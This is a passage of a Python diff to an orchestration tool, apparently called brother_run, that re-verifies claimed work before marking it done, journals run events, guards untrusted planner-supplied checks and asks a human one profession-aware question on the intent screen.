+        return {"missing_reason": "no metric recorded: no evidence file at %s"
+                % path}
+    try:
+        with open(path, "r", encoding="utf-8") as fh:
+            data = json.load(fh)
+    except (OSError, json.JSONDecodeError) as exc:
+        return {"missing_reason": "no metric recorded: %s could not be read "
+                                  "as JSON (%s)" % (path, exc)}
+    if not isinstance(data, dict):
+        return {"missing_reason": "no metric recorded: %s is not a JSON "
+                                  "object" % path}
+    for field in E18_FIELDS:
+        value = data.get(field)
+        if value is None or value == "":
+            return {"missing_reason": "no metric recorded: field %r is "
+                                      "missing from %s" % (field, path)}
+    return {field: data[field] for field in E18_FIELDS}
+
+
 def _verify_evidence(claim, row, cwd):
-    """(ok, evidence_sentence_or_refusal_reason). Independently re-checks the
-    claim store's own account rather than trusting its `state` string, because
-    a claim store is just a file: the harsh EVAD 2026-08-31 drove
-    _mark_integrated directly and it stamped an integrated sentence onto a row
-    whose done_check was literally `false` and whose canonical_rev was the
-    unvalidated literal deadbeef. Every one of the checks below closes exactly
-    that gap, and any one of them failing is a refusal, never a stamp."""
+    """(ok, evidence_sentence_or_refusal_reason, e18_evidence). Independently
+    re-checks the claim store's own account rather than trusting its `state`
+    string, because a claim store is just a file: the harsh EVAD 2026-08-31
+    drove _mark_integrated directly and it stamped an integrated sentence
+    onto a row whose done_check was literally `false` and whose
+    canonical_rev was the unvalidated literal deadbeef. Every one of the
+    checks below closes exactly that gap, and any one of them failing is a
+    refusal, never a stamp. `e18_evidence` is always None except on an `ok`
+    return for a row whose evidence_family is E18, where it is
+    _read_e18_evidence's own dict (the five fields, or a missing_reason);
+    P6 (doc E18/12.6), the statistical evidence a check's bare exit code
+    loses in the log."""
     evidence = (claim or {}).get("evidence")
     if not isinstance(evidence, dict):
         return False, ("no evidence was recorded for this claim (no check "
                        "command, exit code, output or canonical revision); a "
                        "delivery record refuses to claim integration it "
-                       "cannot prove")
+                       "cannot prove"), None
     command = str(evidence.get("check_command") or "").strip()
     exit_code = evidence.get("exit_code")
     output = evidence.get("output")
     rev = str(evidence.get("canonical_rev") or "").strip()
     if not command:
-        return False, "the claim's evidence names no check command"
+        return False, "the claim's evidence names no check command", None
     if not isinstance(exit_code, int) or isinstance(exit_code, bool):
         return False, ("the claim's evidence carries no captured exit code "
-                       "for %r; the check may never have run" % command)
+                       "for %r; the check may never have run" % command), None
     if exit_code != 0:
         return False, ("the claim's own evidence shows %r exited %d, not 0"
-                       % (command, exit_code))
+                       % (command, exit_code)), None
     if output is None:
-        return False, "the claim's evidence carries no captured output at all"
+        return False, ("the claim's evidence carries no captured output at "
+                       "all"), None
     if not rev:
-        return False, "the claim's evidence names no canonical revision"
+        return False, "the claim's evidence names no canonical revision", None
     kind = _git_object_type(cwd, rev)
     if kind is None:
         return False, ("the recorded canonical revision %r does not resolve "
-                       "in %s (git cat-file -t)" % (rev, cwd))
+                       "in %s (git cat-file -t)" % (rev, cwd)), None
     missing = _missing_artifacts(cwd, rev, row.get("owns") or [])
     if missing:
         return False, ("declared artifact(s) not present in the repository at "
-                       "%s: %s" % (rev[:12], ", ".join(missing)))
+                       "%s: %s" % (rev[:12], ", ".join(missing))), None
     reexec_ok, reexec_reason = _reexecute_check(command, cwd, exit_code)
     if not reexec_ok:
-        return False, reexec_reason
+        return False, reexec_reason, None
     note = (" (output truncated to the last 50 lines)"
            if evidence.get("output_truncated") else "")
     body = output if output else "(the check printed nothing)"
+    # E59: the ONE place the verifier's independent re-check comes out true,
+    # after every refusal above has been passed. The run directory is not in
+    # this function's hands (it takes a claim, a row and the TARGET
+    # repository), so it comes from the environment brother_run exports.
+    run_dir = journal.run_dir_from_env()
+    # P6: read AFTER re-execution, per the doc's own words, so the evidence
+    # file this reads is the one the check just wrote, not a stale one from
+    # an earlier attempt at the same unit.
+    e18_evidence = None
+    if str(row.get("evidence_family") or "") == "E18":
+        e18_evidence = _read_e18_evidence(run_dir, row.get("id"))
+    journal.append(run_dir, "evidence.verified",
+                   parent_ids=journal.previous(run_dir), unit_id=row.get("id"),
+                   payload={"canonical_rev": rev[:12], "check_exit": exit_code})
     return True, ("integrated on canonical at %s; check %r exited 0%s. "
-                 "output: %s" % (rev, command, note, body))
+                 "output: %s" % (rev, command, note, body)), e18_evidence
 
 
 def _mark_integrated(record_path, done_ids, claims, cwd):
@@ -1381,6 +2026,9 @@ def _mark_integrated(record_path, done_ids, claims, cwd):
     DONE; `refusals` is {unit_id: reason} for every done_id this refused."""
     with open(record_path, "r", encoding="utf-8") as fh:
         doc = json.load(fh)
+    # E59: the Work document lives in the run directory, so this writer needs
+    # nothing new to find the journal beside it.
+    run_dir = os.path.dirname(os.path.abspath(record_path))
     changed = False
     refusals = {}
     touched = False
@@ -1388,7 +2036,8 @@ def _mark_integrated(record_path, done_ids, claims, cwd):
         uid = row.get("id")
         if uid not in done_ids or row.get("status") == "DONE":
             continue
-        ok, detail = _verify_evidence((claims or {}).get(uid), row, cwd)
+        ok, detail, e18_evidence = _verify_evidence(
+            (claims or {}).get(uid), row, cwd)
         touched = True
         if ok:
             row["status"] = "DONE"
@@ -1397,14 +2046,110 @@ def _mark_integrated(record_path, done_ids, claims, cwd):
             if isinstance(evidence.get("files_changed"), list):
                 row["files_changed_by_unit"] = [
                     str(p) for p in evidence["files_changed"]]
+            # P6: the same spot that stamps the claim's evidence onto the
+            # row stamps its E18 statistical evidence too, so a fresh
+            # record_path re-read later (receipts_for's own input) still
+            # carries it; None (every non-E18 row) leaves the row untouched.
+            if e18_evidence is not None:
+                row["e18_evidence"] = e18_evidence
             changed = True
+            # E59: DONE is stamped on the row and recorded as an event in the
+            # same breath; the event's parent is the evidence.verified one
+            # _verify_evidence just appended for this same unit.
+            journal.append(run_dir, "unit.done",
+                           parent_ids=journal.previous(run_dir), unit_id=uid,
+                           payload={"files_changed": len(
+                               row.get("files_changed_by_unit") or [])})
+            _write_capsule(run_dir)
         else:
             row["integration_refused"] = detail
             refusals[uid] = detail
     if touched:
-        with open(record_path, "w", encoding="utf-8") as fh:
-            json.dump(doc, fh, indent=1)
+        work_record.write_record(record_path, doc)
     return changed, refusals
+
+
+def _clear_lens_inferred(record_path):
+    """P3 (persona integration): a person chose "otherwise" at the intent
+    screen, so the Work document's own lens_inferred field is rewritten to
+    None, the same load/mutate/write shape _mark_integrated (just above)
+    already uses: the file on disk, never the caller's in-memory record,
+    which carries a "path" bookkeeping key that must not round-trip onto
+    it."""
+    with open(record_path, "r", encoding="utf-8") as fh:
+        doc = json.load(fh)
+    doc["lens_inferred"] = None
+    # P5: a corrected lens invalidates any DS-specific challenge machinery
+    # door.py stamped alongside it (an assumption or a pending question,
+    # both computed FROM the same lens_inferred that was just said to be
+    # wrong); cleared here too, or the intent screen would go on to ask
+    # about a lens the person just refused.
+    doc["challenge_assumption"] = None
+    doc["pending_challenge"] = None
+    work_record.write_record(record_path, doc)
+
+
+def _ask_pending_challenge(pending, interactive, stream=None,
+                           prompt_stream=None):
+    """P5 (persona integration, gap P5): the one profession-aware question
+    the intent screen may ask, budgeted to AT MOST ONE per run (this row's
+    own budget; persona doc 4.2's own floor for an ML experiment is 1 to
+    4, and unattended mode is always zero questions, doc 4.2's own floor
+    too). `pending` is the {"lens", "question"} dict door.py stamped on the
+    Work document when the tree could not answer the pack's
+    challenge_question itself, or None/falsy when nothing is pending.
+
+    Returns the human's answer (a stripped, non-empty string), or None:
+    None when nothing is pending, the run is not interactive (the budget
+    is ZERO in unattended mode; nothing is ever read from stdin in that
+    case), or the stream closed or sent a blank line before a real answer
+    arrived. Reads EXACTLY ONE line, never a retry loop like
+    _interactive_resolver's option matching above: this never invents an
+    answer, an unanswered question is NO-DATA on the receipt, not a
+    guess."""
+    if not pending or not interactive:
+        return None
+    question = str(pending.get("question") or "").strip()
+    if not question:
+        return None
+    out = prompt_stream or sys.stderr
+    in_stream = stream or sys.stdin
+    out.write("\n-- profession-aware question (%s) --\n%s\n> "
+              % (pending.get("lens") or NODATA, question))
+    out.flush()
+    line = in_stream.readline()
+    if not line:
+        return None
+    return line.strip() or None
+
+
+def _write_human_decision(record_path, pending, answer, also=None):
+    """P5: the intent screen's one answer, stamped on the Work document,
+    the same load/mutate/write shape _clear_lens_inferred (above) already
+    uses. Never invented: `answer` is exactly what a live human typed
+    (_ask_pending_challenge, above) and `pending` is exactly the question
+    door.py recorded when the tree could not answer it itself.
+    `pending_challenge` is cleared in the same write: it is answered now,
+    not still pending.
+
+    `also` is the composed remainder (persona doc 5.2): [(pending, answer),
+    ...] for every FURTHER pack question this run actually asked and got an
+    answer to, stored under the same decision's "also" key rather than in a
+    second field, so a reader that only knows the {lens, question, answer}
+    shape reads the primary decision unchanged. Empty or None on the
+    single-lens path, which is every run before composition landed."""
+    with open(record_path, "r", encoding="utf-8") as fh:
+        doc = json.load(fh)
+    decision = {"lens": pending.get("lens"),
+                "question": pending.get("question"),
+                "answer": answer}
+    if also:
+        decision["also"] = [{"lens": p.get("lens"),
+                             "question": p.get("question"),
+                             "answer": a} for p, a in also]
+    doc["human_decision"] = decision
+    doc["pending_challenge"] = None
+    work_record.write_record(record_path, doc)
 
 
 def _stamp_prechecks(record_path, cwd, runner=None):
@@ -1454,8 +2199,19 @@ def _stamp_prechecks(record_path, cwd, runner=None):
             # paraphrase of it. Stored only for a broken check; an ordinary
             # failing or passing check has no use for it.
             row["check_stderr_before"] = capture.get("stderr") or ""
-    with open(record_path, "w", encoding="utf-8") as fh:
-        json.dump(doc, fh, indent=1)
+    work_record.write_record(record_path, doc)
+    # E59: one event for the whole pass, carrying the two counts a reader of
+    # the chain needs (how many checks were probed, how many already passed
+    # before any work), never the checks themselves, which the document and
+    # the intent screen already hold.
+    run_dir = os.path.dirname(os.path.abspath(record_path))
+    journal.append(run_dir, "precheck.stamped",
+                   parent_ids=journal.previous(run_dir),
+                   payload={"probed": sum(1 for r in rows
+                                          if r.get("status") != "DONE"),
+                            "already_passing": sum(
+                                1 for r in rows
+                                if r.get("check_passed_before") is True)})
     return rows
 
 
@@ -1703,8 +2459,7 @@ def _stamp_dependency_mutations(record_path, claims, cwd, log=None,
         stamped[uid] = entries
         touched = True
     if touched:
-        with open(record_path, "w", encoding="utf-8") as fh:
-            json.dump(doc, fh, indent=1)
+        work_record.write_record(record_path, doc)
     return stamped
 
 
@@ -1806,6 +2561,15 @@ def _rewrite_broken_checks(record_path, cwd, log, runner=None, model_cmd=None):
         if note:
             new_check = resolved
             log.note("door: %s" % note)
+        # E78: the planner's reply is untrusted text; refuse it before it
+        # ever becomes this row's done_check rather than filter what runs.
+        # The refusal names the unit and the rule broken, never the command
+        # (the command came from the same untrusted reply this is refusing).
+        allowed, refusal_reason = door.guard_adopted_check(new_check)
+        if not allowed:
+            log.note("brother_run: refusing %s's replacement done_check "
+                     "(%s); keeping the original" % (uid, refusal_reason))
+            continue
         capture = {}
         passed, exit_before, looks_broken, _note = _check_passes_now(
             new_check, cwd, runner, capture=capture)
@@ -1825,9 +2589,16 @@ def _rewrite_broken_checks(record_path, cwd, log, runner=None, model_cmd=None):
                  "planner once (%s)" % (
                      uid, "still looks broken" if looks_broken
                      else "now runnable"))
+        # E59: the check a receipt will later quote is not the one the
+        # planner first wrote, and this is the event that says so. The two
+        # commands themselves stay on the row (check_original beside
+        # done_check); the journal records that the swap happened.
+        run_dir = os.path.dirname(os.path.abspath(record_path))
+        journal.append(run_dir, "check.rewritten",
+                       parent_ids=journal.previous(run_dir), unit_id=uid,
+                       payload={"still_looks_broken": bool(looks_broken)})
     if touched:
-        with open(record_path, "w", encoding="utf-8") as fh:
-            json.dump(doc, fh, indent=1)
+        work_record.write_record(record_path, doc)
     return rows
 
 
@@ -1865,12 +2636,21 @@ def _refuse_broken_precheck_units(record_path):
             # _refuse_exhausted_units for the other writer of it.
             row["refused_before_work"] = True
             refused[row.get("id")] = (row, reason)
+            # E59: the reason is long and already lives on the row, so the
+            # event carries the STAGE instead, which is what a chain needs to
+            # tell this refusal from the verifier's later one.
+            run_dir = os.path.dirname(os.path.abspath(record_path))
+            journal.append(run_dir, "unit.refused",
+                           parent_ids=journal.previous(run_dir),
+                           unit_id=row.get("id"),
+                           payload={"stage": "before any worker started",
+                                    "why": "its check cannot run"})
+            _write_capsule(run_dir)
         else:
             kept.append(row)
     if refused:
         doc[key] = kept
-        with open(record_path, "w", encoding="utf-8") as fh:
-            json.dump(doc, fh, indent=1)
+        work_record.write_record(record_path, doc)
     return refused
 
 
@@ -1924,12 +2704,21 @@ def _refuse_exhausted_units(record_path, claims_path):
             row["integration_refused"] = reason
             row["refused_before_work"] = True
             refused[row.get("id")] = (row, reason)
+            # E59: the other refusal before any worker starts (see
+            # _refuse_broken_precheck_units above), told apart by its own why.
+            run_dir = os.path.dirname(os.path.abspath(record_path))
+            journal.append(run_dir, "unit.refused",
+                           parent_ids=journal.previous(run_dir),
+                           unit_id=row.get("id"),
+                           payload={"stage": "before any worker started",
+                                    "why": "the retry budget is spent",
+                                    "attempts": attempts})
+            _write_capsule(run_dir)
         else:
             kept.append(row)
     if refused:
         doc[key] = kept
-        with open(record_path, "w", encoding="utf-8") as fh:
-            json.dump(doc, fh, indent=1)
+        work_record.write_record(record_path, doc)
     return refused
 
 
@@ -1949,8 +2738,7 @@ def _stamp_harness(record_path, field, revision, overwrite):
         doc = json.load(fh)
     if overwrite or not doc.get(field):
         doc[field] = revision
-        with open(record_path, "w", encoding="utf-8") as fh:
-            json.dump(doc, fh, indent=1)
+        work_record.write_record(record_path, doc)
     return doc
 
 
@@ -2028,8 +2816,7 @@ def _restore_refused_precheck_units(record_path, refused, order):
     for uid, (row, _reason) in refused.items():
         by_id[uid] = row
     doc[key] = [by_id[uid] for uid in order if uid in by_id]
-    with open(record_path, "w", encoding="utf-8") as fh:
-        json.dump(doc, fh, indent=1)
+    work_record.write_record(record_path, doc)
 
 
 def _is_test_path(path):
@@ -2098,8 +2885,18 @@ def _unit_check_lines(rows):
         objective = str(row.get("objective") or row.get("title")
                        or row.get("name") or "")
         check = str(row.get("done_check") or "(no done_check recorded)")
-        line = "%s: %s. done_check: `%s`. depends on: %s" % (
-            row.get("id"), objective, check, _depends_on_text(row))
+        # P1 (persona integration): evidence family, oracle source and the
+        # independence work_record.py derived from it, read straight off
+        # the row (work_record.create() stamps all three; a row it never
+        # touched simply has none, and that reads NO-DATA/unverified here,
+        # never a guessed family).
+        family = str(row.get("evidence_family") or NODATA)
+        oracle = str(row.get("oracle_source") or NODATA)
+        independence = str(row.get("independence") or "unverified")
+        line = ("%s: %s. done_check: `%s`. depends on: %s. evidence family: "
+                "%s, oracle: %s, independence: %s" % (
+            row.get("id"), objective, check, _depends_on_text(row),
+            family, oracle, independence))
         if row.get("check_passed_before") is True:
             line += (" WARNING: this check already passes before any work; "
                      "it cannot prove the work.")
@@ -2111,6 +2908,67 @@ def _unit_check_lines(rows):
             # assertion a real fix could turn green.
             line += " WARNING: this check cannot run; it cannot prove the work."
         lines.append(line)
+    return lines
+
+
+def _risk_line(triggers):
+    """P4: one line for the intent screen, aggregating
+    receipt_door.risk_triggers' per-unit hits ([(name, unit_id, words), ...])
+    by risk class name so a person reads the blast radius once rather than
+    once per unit: 'Risk: migration (words: backfill), money (words:
+    billing)'. "" when the units named none of the six classes, so a plain
+    change's intent screen carries no risk line at all, the same "never cry
+    wolf" rule risk_triggers itself documents (receipt_door.py line 58)."""
+    if not triggers:
+        return ""
+    words_by_name = {}
+    for name, _unit_id, words in triggers:
+        seen = words_by_name.setdefault(name, [])
+        for word in words.split(", "):
+            if word and word not in seen:
+                seen.append(word)
+    return "Risk: " + ", ".join(
+        "%s (words: %s)" % (name, ", ".join(words))
+        for name, words in words_by_name.items())
+
+
+def _human_decision_lines(record):
+    """P4/P5: P5's own landed HUMAN_DECISION shape, read back here for the
+    intent screen's summary. `record["human_decision"]` is a single dict,
+    {"lens", "question", "answer"}, written once by _write_human_decision
+    (above) after a live person answers the one profession-aware question;
+    None (P5's own default on every fresh Work document) until then. []
+    when absent, because an absent field is not a fact to invent a line
+    around; a resumed run whose question was already answered shows the
+    one line here, same as door.py's own lens assumption line beside it."""
+    decision = record.get("human_decision")
+    if not isinstance(decision, dict):
+        return []
+    question = str(decision.get("question") or "").strip()
+    answer = str(decision.get("answer") or "").strip()
+    lens = str(decision.get("lens") or "").strip()
+    label = "Human decision (%s)" % lens if lens else "Human decision"
+    if question:
+        lines = ["%s: %s -> %s" % (label, question, answer)]
+    else:
+        lines = ["%s: %s" % (label, answer)]
+    # COMPOSED (persona doc 5.2): a second inferred pack's question, when
+    # this run asked one and a person answered it, gets its own line here
+    # rather than being folded into the primary one. Absent on every
+    # single-lens run, which is every run before composition landed.
+    for extra in (decision.get("also") or []):
+        if not isinstance(extra, dict):
+            continue
+        extra_lens = str(extra.get("lens") or "").strip()
+        extra_label = ("Human decision (%s)" % extra_lens if extra_lens
+                       else "Human decision")
+        extra_question = str(extra.get("question") or "").strip()
+        extra_answer = str(extra.get("answer") or "").strip()
+        if extra_question:
+            lines.append("%s: %s -> %s"
+                         % (extra_label, extra_question, extra_answer))
+        else:
+            lines.append("%s: %s" % (extra_label, extra_answer))
     return lines
 
 
@@ -2343,6 +3201,18 @@ def main(argv=None):
                          "one; bare picks the only match (or lists them, "
                          "numbered, when there is more than one), --continue "
                          "N picks the Nth from that list")
+    ap.add_argument("--heartbeat-seconds", type=float, default=None,
+                    metavar="N",
+                    help="how often, in seconds, a running piece of work "
+                         "reports itself while nothing else is being "
+                         "printed; 0 turns it off. Defaults to %d, or to "
+                         "%s when that is set"
+                         % (run_heartbeat.DEFAULT_INTERVAL_SECONDS,
+                            run_heartbeat.INTERVAL_ENV_VAR))
+    ap.add_argument("--quiet", action="store_true",
+                    help="the old silence: no progress line while a piece of "
+                         "work runs, and no durations of earlier runs on the "
+                         "intent screen. The report at the end is unchanged")
     ap.add_argument("--runs-root",
                     help="where the run's Work document and claim store live "
                          "(under docs/plan/runs); defaults to this tool's own "
@@ -2365,6 +3235,13 @@ def main(argv=None):
     # from as close to process start as argument parsing allows, through to
     # the delivery report below. Never estimated.
     run_start = datetime.datetime.now()
+    # E46: one number decided once, here, so the flag, the env var and
+    # --quiet cannot disagree later. --quiet wins over both, because a
+    # person who asked for silence asked for silence.
+    heartbeat_seconds = (
+        0.0 if args.quiet
+        else (run_heartbeat.interval_from_env()
+              if args.heartbeat_seconds is None else args.heartbeat_seconds))
     # harness-revision-v1: measured ONCE, here, before the door is asked, so
     # the creator stamp on a fresh record, the resumer stamp on a resumed one
     # and the cost block all name the same commit of this engine; a checkout
@@ -2412,6 +3289,10 @@ def main(argv=None):
                       % (idx, len(matches), cwd), file=sys.stderr)
                 return 1
             run_dir, outcome, record = matches[idx - 1]
+        # E73.2: --continue's own first words, before anything else this
+        # branch prints, are the capsule's resume screen when this run left
+        # one, or NO-DATA naming it when it did not.
+        _print_resume_screen(run_dir, outcome)
         # ONE PLAIN SENTENCE NAMING THE OUTCOME, never the run directory: a
         # person who never knew run directories existed should not have to
         # learn what one is just to resume their own crashed work.
@@ -2500,16 +3381,73 @@ def main(argv=None):
                 # carries.
                 _stamp_harness(record["path"], "harness_revision",
                                harness_revision, overwrite=False)
+                # E59, WORK CREATED, journalled HERE rather than in
+                # work_record.create where the inventory named it. That
+                # function writes into whatever --store it is given, and a
+                # plain work store is not a run directory: a journal beside
+                # the record there broke test_door.py's own contract that a
+                # store holds exactly the record written to it (measured, 2
+                # != 1, before this moved). This is the one place that knows
+                # the store WAS this run's directory, and the run's own
+                # journal is where the event belongs.
+                journal.append(run_dir, "work.created", payload={
+                    "work_id": record.get("work_id"),
+                    "units": len(record.get("rows")
+                                 or record.get("units") or [])})
+    if resumed:
+        # THE FENCE ON A FILE-SOURCED RECORD (security review 2026-09-04,
+        # Critical). Every path above that reached here with `resumed` set
+        # read its record off disk; a fresh run's record came from the door
+        # a few lines up. Refusing the whole run rather than skipping the
+        # unit is deliberate: a record holding one crafted check is not a
+        # record to half-trust, and NO-DATA is never a pass.
+        refused_checks = _guard_record_checks(record)
+        for unit_id, reason in refused_checks:
+            print("brother_run: %s's done_check was refused: %s"
+                  % (unit_id, reason), file=sys.stderr)
+        if refused_checks:
+            print("brother_run: this record was loaded from disk, so its "
+                  "checks are treated as repository-supplied content and "
+                  "must each be one plain shell command. Nothing was "
+                  "claimed or run; edit the refused done_check(s) in %s and "
+                  "resume again." % record.get("path", "the Work document"),
+                  file=sys.stderr)
+            return 1
     if args.dry_run:
         print("brother_run: --dry-run, stopping before any work is claimed "
               "or run")
         return 0
+    # E59, THE RUN'S JOURNAL OPENS HERE, and here is the earliest honest
+    # place: run_dir is settled on all three paths above (fresh, --resume,
+    # --continue), the directory exists (the door created it, or the run
+    # being resumed did), and --dry-run has already returned, so a run that
+    # never started never leaves a journal behind. The inventory named
+    # run_dir_for() as the site; that function only COMPUTES a path string,
+    # for a directory nothing has created yet and which --dry-run must not
+    # create, so the event moved to where the run actually opens.
+    #
+    # The environment carries the run directory to the writers that hold no
+    # run of their own (claim_store, integrate, worktree_lane, and
+    # receipt_door's read-time projection), the same thread the two
+    # merge-trailer variables below already use.
+    os.environ[journal.RUN_DIR_ENV_VAR] = run_dir
+    run_event = journal.append(run_dir, "run.opened", payload={
+        "cwd": cwd, "resumed": resumed,
+        "units": len(record.get("rows") or record.get("units") or [])})
+    _write_capsule(run_dir)
     if resumed:
         # THE RESUMER, the second field beside the creator's, latest wins;
         # the receipts below name both (build_report).
         doc = _stamp_harness(record["path"], "harness_revision_resumed",
                              harness_revision, overwrite=True)
         created_by = str(doc.get("harness_revision") or NODATA)
+        # E59: the one event whose parent is genuinely in hand rather than
+        # taken from the run-level predecessor; run.opened was appended a few
+        # lines above and its id is still held.
+        journal.append(run_dir, "run.resumed", parent_ids=[run_event],
+                       payload={"harness": harness_revision[:12],
+                                "created_by": created_by[:12]})
+        _write_capsule(run_dir)
         log.say("brother_run: resumed under harness %s; the record was "
                 "created under harness %s"
                 % (NODATA if harness_revision.startswith(NODATA)
@@ -2604,12 +3542,77 @@ def main(argv=None):
         "pros": ["nothing is claimed, run, or written until you say so"],
         "cons": ["the outcome goes unattempted"],
     }
+    # P3 (persona integration): door.py's own tree-signal matcher already
+    # stamped lens_inferred on the Work document at creation time (or left
+    # it None, when nothing matched); this screen only reads it back and
+    # prints it, the one-visible-Brother rule (no new command, no new
+    # mode). extra_options carries a second correction option ONLY when a
+    # lens was actually inferred, so a plain repository's intent screen is
+    # unchanged. It names no `scores`, exactly like refuse_option above, so
+    # an unattended run never picks it either.
+    lens_inferred = record.get("lens_inferred")
+    lens_name = (lens_inferred or {}).get("lens")
+    # COMPOSITIONAL (persona doc 5.2): door.py stamps EVERY inferred lens
+    # in `lenses`, most specific first; this line names all of them with
+    # their own matched paths, each capped as before. A Work document
+    # written before composition landed carries no `lenses` key, so the
+    # single {lens, matched_paths} dict is passed instead and the line
+    # reads exactly as it did then.
+    lens_line = door.lenses_assumption_line(
+        (lens_inferred or {}).get("lenses")
+        or ([lens_inferred] if lens_inferred else []))
+    # P5 (persona integration): door.py's own metric search already decided
+    # whether the tree answers the pack's challenge_question; this screen
+    # only reads the result back. An assumption is stated here, in the
+    # same summary block as the lens line; a PENDING question (nothing
+    # found) is read further below, once the choice is known, since asking
+    # it is only ever right after "proceed" is actually chosen.
+    challenge_line = door.challenge_assumption_line(
+        record.get("challenge_assumption"))
+    # P4: the intent screen's own risk, rollback and evidence-plan lines,
+    # doc 4.1 stage 4's other blocks beside the unit list this screen
+    # already printed. risk_triggers is receipt_door's, reused outright
+    # (never redefined here) and run once, on precheck_rows, before any unit
+    # is claimed; each unit_lines entry already carries its evidence family
+    # (P1). `before`, above, is this target's own HEAD read before the dirty
+    # check and before any claim, so it is exactly the revision a rollback
+    # returns to, not a second git call.
+    assumption_lines = ([lens_line] if lens_line else []) + \
+        ([challenge_line] if challenge_line else []) + \
+        _human_decision_lines(record)
+    # The lenses this run inferred are passed with the rows: a persona
+    # pack's forcing classes are armed for a repository that pack was
+    # inferred for and for no other, so "add a retry to the fetch helper"
+    # no longer reads the backend pack's "retry" class on a tree that is
+    # not a service (receipt_door._lens_forcing_triggers).
+    risk_line = _risk_line(receipt_door.risk_triggers(
+        precheck_rows, receipt_door.record_lenses(record)))
+    rollback_line = "Rollback: %s" % (before or NODATA)
+    lens_options = []
+    if lens_name:
+        lens_options.append({
+            "id": "otherwise", "name": "Say otherwise: not %s work" % lens_name,
+            "one_liner": "clear the assumed lens on the Work document",
+            "cost": "none: only the lens_inferred field changes",
+            "reversible": "moot: nothing about the plan itself changes",
+            "pros": ["a wrong assumption is not silently carried into any "
+                    "profession-aware step downstream"],
+            "cons": ["none named"],
+        })
+    summary_blocks = []
+    if assumption_lines:
+        summary_blocks.append("\n".join(assumption_lines))
+    if risk_line:
+        summary_blocks.append(risk_line)
+    summary_blocks.append(
+        "This is what this run is about to act on before anything is "
+        "claimed or run, one line per piece of work, exactly as the "
+        "planning model wrote it:\n\n" + "\n".join(unit_lines))
+    summary_blocks.append(bounds_line)
+    summary_blocks.append(rollback_line)
     intent_choice = _human_moment(log, "intent", _fact_spec(
         title="Proceed with this outcome", eyebrow="Intent",
-        plain_summary="This is what this run is about to act on before "
-                      "anything is claimed or run, one line per piece of "
-                      "work, exactly as the planning model wrote it:\n\n"
-                      + "\n".join(unit_lines) + "\n\n" + bounds_line,
+        plain_summary="\n\n".join(summary_blocks),
         question="Is this the outcome you meant, and are these the checks "
                  "that should decide it?",
         option_id="proceed", option_name="Proceed as decomposed",
@@ -2625,11 +3628,74 @@ def main(argv=None):
                 else 10.0,
                 "%d of %d piece(s) already carry a verified DONE status on "
                 "this run's own Work document" % (already, total_units)),
-        }, extra_options=[refuse_option]), resolver=live_resolver)
+        }, extra_options=[refuse_option] + lens_options), resolver=live_resolver)
     if intent_choice.get("choice") == "refuse":
         print("brother_run: refused at the intent screen; nothing was "
               "claimed or run", file=sys.stderr)
         return 1
+    if intent_choice.get("choice") == "otherwise":
+        # THE REWRITE (P3): the person just said this is not the assumed
+        # lens, so the field is corrected on the Work document, same
+        # load/mutate/write shape _stamp_prechecks already uses; the run
+        # proceeds normally, with no lens assumed. P5 rides along: any
+        # challenge machinery derived from this same lens is stale too
+        # (_clear_lens_inferred now clears it on disk as well), so the
+        # in-memory copy is corrected here in the same breath, before the
+        # question-asking block below ever reads pending_challenge.
+        _clear_lens_inferred(record["path"])
+        record["lens_inferred"] = None
+        record["challenge_assumption"] = None
+        record["pending_challenge"] = None
+        log.say("brother_run: the assumed lens (%s) was corrected at the "
+                "intent screen; lens_inferred cleared on the Work document"
+                % lens_name)
+    # P5 (persona integration, gap P5): the ONE profession-aware question
+    # this run may ask, only once "proceed" was actually chosen (a refused
+    # run asks nothing) and only when door.py left a question pending (the
+    # tree could not answer it itself). _ask_pending_challenge enforces the
+    # whole budget by itself: it reads nothing at all unless `interactive`
+    # is True, so an unattended run asks zero questions, exactly as the
+    # doc's own floor requires, and the missing metric is left to read
+    # NO-DATA on the receipt (build_report, below) instead.
+    pending_challenge = record.get("pending_challenge")
+    if intent_choice.get("choice") == "proceed" and pending_challenge:
+        # COMPOSED (persona doc 5.2): compute_challenge may have composed a
+        # second pack's question onto the primary one, already cut to the
+        # summed question budget. They are asked in composed order, most
+        # specific lens first, each still exactly one line read by
+        # _ask_pending_challenge, which by itself keeps an unattended run
+        # at zero questions. An unanswered question stops the composition:
+        # a closed stream will not answer the next one either.
+        composed = pending_challenge.get("questions") or [pending_challenge]
+        answered = []
+        for pending in composed:
+            answer = _ask_pending_challenge(pending, interactive)
+            if not answer:
+                break
+            answered.append((pending, answer))
+        if answered:
+            pending_challenge, challenge_answer = answered[0]
+            _write_human_decision(record["path"], pending_challenge,
+                                  challenge_answer, also=answered[1:])
+            record["human_decision"] = {
+                "lens": pending_challenge.get("lens"),
+                "question": pending_challenge.get("question"),
+                "answer": challenge_answer}
+            if answered[1:]:
+                record["human_decision"]["also"] = [
+                    {"lens": p.get("lens"), "question": p.get("question"),
+                     "answer": a} for p, a in answered[1:]]
+            record["pending_challenge"] = None
+            for pending, answer in answered:
+                log.say("brother_run: profession-aware question answered "
+                        "(%s): %s -> %s" % (pending.get("lens") or NODATA,
+                                            pending.get("question"), answer))
+        else:
+            log.say("brother_run: profession-aware question not answered "
+                    "(%s); the missing metric reads NO-DATA on the receipt"
+                    % ("zero questions in unattended mode" if not interactive
+                       else "the input stream closed before an answer "
+                            "arrived"))
     # THE DECLARATION IN THE RESOLUTION LINE TOO (E40): what each unit says
     # it builds on, by field name, beside the choice that let the run
     # proceed, so a grep of the log for depends_on finds it.
@@ -2699,12 +3765,20 @@ def main(argv=None):
         # minutes" would not be. The BOUND is a different thing from an
         # estimate and is stated: the attempt cap and the per-attempt limit
         # the intent screen already carries.
+        # E46: the honest sentence stays exactly as it was (this estate will
+        # not invent a duration), and the MEASURED durations of earlier runs
+        # against this same target are added beside it when there are any.
+        # Real figures from finished runs are not an estimate of this one and
+        # the wording says so; --quiet drops them with the heartbeat.
+        earlier = ("" if heartbeat_seconds <= 0 else
+                   previous_runs_line(previous_run_durations(runs_root, cwd)))
         log.say("brother_run: %d piece(s) of work, none finished yet. How "
                 "long this takes is not knowable in advance, so no estimate "
                 "is given; each piece reports as it lands. Each piece gets "
                 "at most %d attempt(s), and one attempt's worker is stopped "
-                "after %d seconds." % (total_units, MAX_UNIT_ATTEMPTS,
-                                       limit_seconds))
+                "after %d seconds.%s" % (total_units, MAX_UNIT_ATTEMPTS,
+                                         limit_seconds,
+                                         (" " + earlier) if earlier else ""))
 
     # The graph DRAINS across batches: one loop_bridge run claims only the
     # units dispatchable at its start, so a unit whose dependency integrates
@@ -2734,6 +3808,18 @@ def main(argv=None):
